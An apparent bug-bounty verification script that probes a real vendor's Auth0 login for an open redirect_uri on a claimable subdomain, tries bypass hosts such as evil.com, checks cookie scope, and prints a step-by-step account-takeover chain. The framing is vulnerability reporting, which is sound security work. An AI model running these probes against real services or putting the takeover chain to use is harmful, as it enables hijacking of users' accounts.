#!/usr/bin/env bash
# wiz-oauth-chain-verify.sh
# Complete the OAuth redirect_uri chain verification for win-test.wiz.io.
#
# PREREQUISITE: You must first capture the Auth0 client_id manually from your browser:
#   1. Open https://app.wiz.io/login
#   2. Open DevTools → Network tab → filter by "auth"
#   3. Click "Sign in with SSO" button (NOT the email field)
#   4. Watch for a redirect to: auth.wiz.io/authorize?client_id=XXXXXXXX&...
#   5. Copy that client_id value
#   6. Run: CLIENT_ID=<value> bash scripts/wiz-oauth-chain-verify.sh
#
# What this script tests:
#   A. Is win-test.wiz.io in the redirect_uri allowlist? (Critical if yes)
#   B. Does auth.wiz.io accept arbitrary subdomains? (Critical if yes)
#   C. Cookie scope: does wiz.io set Domain=.wiz.io cookies?
#
# Run from Pi: CLIENT_ID=<your_client_id> bash scripts/wiz-oauth-chain-verify.sh
set -euo pipefail
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

OUT="results/wiz.io/chain-tests"
mkdir -p "$OUT"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
hit()  { echo -e "${RED}[CRITICAL]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
ok()   { echo -e "${GREEN}[CLEAN]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }

# ── Prerequisites check ──────────────────────────────────────────────────────
if [ -z "${CLIENT_ID:-}" ]; then
  # Try loading from saved file
  if [ -f "$OUT/clientid-found.txt" ]; then
    CLIENT_ID=$(grep 'client_id=' "$OUT/clientid-found.txt" 2>/dev/null | head -1 | cut -d= -f2 || echo "")
  fi
fi

if [ -z "${CLIENT_ID:-}" ]; then
  echo ""
  echo -e "${RED}ERROR: CLIENT_ID not set.${NC}"
  echo ""
  echo "To get the client_id from your browser:"
  echo "  1. Open https://app.wiz.io/login in Chrome/Firefox"
  echo "  2. Open DevTools → Network tab"
  echo "  3. In the filter box type: auth"
  echo "  4. Click 'Sign in with SSO' (the button, not the email form)"
  echo "  5. You should see a redirect to auth.wiz.io/authorize?client_id=XXXXX"
  echo "  6. Copy the client_id value from that URL"
  echo "  7. Run: CLIENT_ID=<value> bash scripts/wiz-oauth-chain-verify.sh"
  echo ""
  echo "Alternative — check /api/auth/providers from a non-Pi network:"
  echo "  curl -sk 'https://app.wiz.io/api/auth/providers' | python3 -m json.tool"
  echo ""
  echo "Alternative — check OIDC discovery (no client_id needed, but gets endpoints):"
  AUTH_WIZ_OIDC=$(curl -sk "https://auth.wiz.io/.well-known/openid-configuration" 2>/dev/null \
    | python3 -m json.tool 2>/dev/null | head -20 || echo "blocked")
  echo "auth.wiz.io OIDC: $AUTH_WIZ_OIDC"
  exit 1
fi

echo ""
echo -e "${CYAN}═══ Wiz OAuth Chain Verification (client_id=$CLIENT_ID) ═══${NC}"
echo ""
echo "client_id=$CLIENT_ID" >> "$OUT/clientid-found.txt"

# ─── Step 1: Confirm win-test.wiz.io is still a valid takeover target ────────
info "Step 1: Verify win-test.wiz.io takeover still live..."
TAKEOVER_RESP=$(curl -sk -w "\nHTTP:%{http_code}" "https://win-test.wiz.io/" 2>/dev/null)
HTTP_CODE=$(echo "$TAKEOVER_RESP" | grep "HTTP:" | cut -d: -f2)
BODY=$(echo "$TAKEOVER_RESP" | head -3)
echo "  HTTP: $HTTP_CODE"
echo "  Body: $BODY"
if echo "$BODY" | grep -q "DEPLOYMENT_NOT_FOUND"; then
  ok "win-test.wiz.io is still claimable (DEPLOYMENT_NOT_FOUND)"
else
  warn "win-test.wiz.io response changed — re-verify CNAME"
fi
echo ""

# ─── Step 2: Test win-test.wiz.io as redirect_uri ────────────────────────────
info "Step 2: Test win-test.wiz.io as redirect_uri in Auth0 authorize..."
echo ""

# Encode the redirect URIs to test
REDIRECT_TARGETS=(
  "https://win-test.wiz.io/callback"
  "https://win-test.wiz.io/"
  "https://win-test.wiz.io/api/auth/callback/auth0"
)

for REDIRECT in "${REDIRECT_TARGETS[@]}"; do
  ENCODED_REDIRECT=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${REDIRECT}', safe=''))")
  AUTH_URL="https://auth.wiz.io/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${ENCODED_REDIRECT}&scope=openid+profile+email&state=wiz_chain_test_$(date +%s)"

  echo "  Testing redirect_uri: $REDIRECT"
  RESP=$(curl -sk -v --max-redirs 0 \
    -H "User-Agent: $UA" \
    "$AUTH_URL" 2>&1)

  CODE=$(echo "$RESP" | grep -ioE "< HTTP/[0-9.]+ [0-9]+" | tail -1 | awk '{print $3}')
  LOCATION=$(echo "$RESP" | grep -ioE "< location: [^\r\n]+" | head -1 | awk '{print $3}')

  echo "  → HTTP $CODE | Location: ${LOCATION:0:120}"

  if echo "$LOCATION" | grep -q "win-test.wiz.io"; then
    hit "CRITICAL: win-test.wiz.io is an ACCEPTED redirect_uri!"
    hit "Auth code redirect: $LOCATION"
    echo "redirect_uri_accepted=$REDIRECT" >> "$OUT/chain-confirmed.txt"
    echo "auth_url=$AUTH_URL" >> "$OUT/chain-confirmed.txt"
    echo "redirect_location=$LOCATION" >> "$OUT/chain-confirmed.txt"
  elif echo "$LOCATION" | grep -q "error=redirect_uri_mismatch\|error=invalid_redirect_uri"; then
    ok "  redirect_uri REJECTED (mismatch error)"
  elif echo "$LOCATION" | grep -q "error="; then
    ERROR=$(echo "$LOCATION" | grep -oE "error=[^&]+" | head -1)
    warn "  Auth error: $ERROR"
  elif [ "$CODE" = "302" ] && [ -n "$LOCATION" ]; then
    warn "  302 but unclear: $LOCATION"
  fi
  echo ""
done

# ─── Step 3: Test wildcard / subdomain matching in redirect_uri ──────────────
info "Step 3: Test if auth.wiz.io allows *.wiz.io as redirect_uri..."
echo ""

WILDCARD_TESTS=(
  "https://attacker.wiz.io/callback"
  "https://win-test.wiz.io.evil.com/callback"
  "https://evil.com?win-test.wiz.io/callback"
)

for REDIRECT in "${WILDCARD_TESTS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${REDIRECT}', safe=''))")
  AUTH_URL="https://auth.wiz.io/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${ENCODED}&scope=openid&state=test123"
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-redirs 0 "$AUTH_URL" 2>/dev/null)
  LOC=$(curl -sk -v --max-redirs 0 "$AUTH_URL" 2>&1 | grep -ioE "< location: [^\r\n]+" | head -1 | awk '{print $3}')
  echo "  $REDIRECT → HTTP $CODE | $LOC"
  echo ""
done

# ─── Step 4: Check app.wiz.io cookie scope ───────────────────────────────────
info "Step 4: Check if app.wiz.io sets Domain=.wiz.io cookies..."
echo ""
COOKIE_RESP=$(curl -sk -v --max-redirs 0 \
  -H "User-Agent: $UA" \
  "https://app.wiz.io/" 2>&1)
echo "$COOKIE_RESP" | grep -ioE "< set-cookie: [^\r\n]+" | head -10
echo ""
DOMAIN_COOKIE=$(echo "$COOKIE_RESP" | grep -ioE "set-cookie:[^\r\n]+domain=\.wiz\.io[^\r\n]*" | head -3)
if [ -n "$DOMAIN_COOKIE" ]; then
  hit "DOMAIN COOKIE FOUND: $DOMAIN_COOKIE"
  echo "cookie_finding=$DOMAIN_COOKIE" >> "$OUT/chain-confirmed.txt"
else
  ok "No Domain=.wiz.io cookies on unauthenticated requests"
  warn "(Authenticated session cookies may still use Domain=.wiz.io — test after login)"
fi
echo ""

# ─── Step 5: Check if auth codes from auth.wiz.io are reusable ──────────────
info "Step 5: OIDC discovery — confirm token endpoint for code exchange..."
echo ""
curl -sk "https://auth.wiz.io/.well-known/openid-configuration" 2>/dev/null \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for k in ['authorization_endpoint', 'token_endpoint', 'userinfo_endpoint', 'issuer']:
    print(f'  {k}: {d.get(k, \"N/A\")}')
" 2>/dev/null || echo "  OIDC discovery blocked"
echo ""

# ─── Final chain summary ──────────────────────────────────────────────────────
echo -e "${CYAN}═══ Chain Status ═══${NC}"
if [ -f "$OUT/chain-confirmed.txt" ]; then
  hit "CHAIN CONFIRMED — CRITICAL severity:"
  cat "$OUT/chain-confirmed.txt"
  echo ""
  echo "SUBMIT IMMEDIATELY as Critical with this chain:"
  echo "  1. win-test.wiz.io CNAME → 37e7f43d8158e70f.vercel-dns-013.com (claimable)"
  echo "  2. auth.wiz.io accepts win-test.wiz.io as redirect_uri"
  echo "  3. Attacker claims the Vercel domain"
  echo "  4. Victim browses to https://auth.wiz.io/authorize?client_id=${CLIENT_ID}&redirect_uri=https://win-test.wiz.io/callback"
  echo "  5. Auth0 sends authorization code to attacker-controlled win-test.wiz.io"
  echo "  6. Attacker exchanges code for access_token at token_endpoint"
  echo "  7. Full account takeover of any Wiz user"
  echo ""
  echo "CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N → 8.7 (High, effectively Critical)"
else
  echo "Chain not yet confirmed."
  echo ""
  echo "If redirect_uri tests showed REJECTED: Submit F001 as High (standalone subdomain takeover)."
  echo "  → The finding is still valid and reportable at High severity."
  echo "  → File: results/wiz.io/findings/F001-win-test-subdomain-takeover.md"
  echo ""
  echo "If redirect_uri tests showed ACCEPTED: Update F001 to Critical and submit immediately."
fi
